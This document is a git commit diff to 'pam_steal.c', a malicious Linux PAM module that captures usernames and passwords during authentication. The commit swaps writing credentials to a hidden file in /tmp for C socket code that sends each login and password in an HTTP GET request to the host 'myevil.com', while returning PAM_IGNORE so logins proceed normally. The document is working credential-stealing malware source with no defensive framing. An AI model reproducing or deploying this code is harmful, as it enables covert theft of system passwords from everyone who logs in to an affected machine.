0a8b4fa9848c749d538ac5fa3f0ee15bb2c54e06
Ali <allyshka@users.noreply.github.com>
2016-01-11 18:22:32 +0300

    Log passwords to remote server with GET
    # TODO Add hostname or IP server to parameters

--- pam_steal/pam_steal.c
+++ pam_steal/pam_steal.c
@@ -6,6 +6,12 @@
 
 #include <stdio.h>
 #include <security/pam_modules.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t * pamh, int flags
                                    ,int argc, const char **argv)
@@ -13,7 +19,6 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t * pamh, int flags
     int retval;
     const char *username;
     const void *password;
-    FILE *log;
 
     retval = pam_get_user(pamh, &username, NULL);
     if (retval != PAM_SUCCESS) {
@@ -25,9 +30,38 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t * pamh, int flags
         return PAM_IGNORE;
     }
 
-    log = fopen ("/tmp/.steal.log", "a");
-    fprintf( log, "%s: %s\n", username, password);
-    fclose( log);
+    int portno =        80;
+    char *host =        "myevil.com";
+    char *message_fmt = "GET /?login=%s&passw=%s HTTP/1.0\r\n\r\n";
+
+    struct hostent *server;
+    struct sockaddr_in serv_addr;
+    int sockfd, bytes, sent, total;
+    char message[1024];
+
+    sprintf(message,message_fmt,username,password);
+
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    server = gethostbyname(host);
+    if (server != NULL) {
+        memset(&serv_addr,0,sizeof(serv_addr));
+        serv_addr.sin_family = AF_INET;
+        serv_addr.sin_port = htons(portno);
+        memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);
+
+        connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
+
+        total = strlen(message);
+        sent = 0;
+        do {
+            bytes = write(sockfd,message+sent,total-sent);
+            if (bytes == 0)
+                break;
+            sent+=bytes;
+        } while (sent < total);
+
+        close(sockfd);
+    }
 
     return PAM_IGNORE;
 }
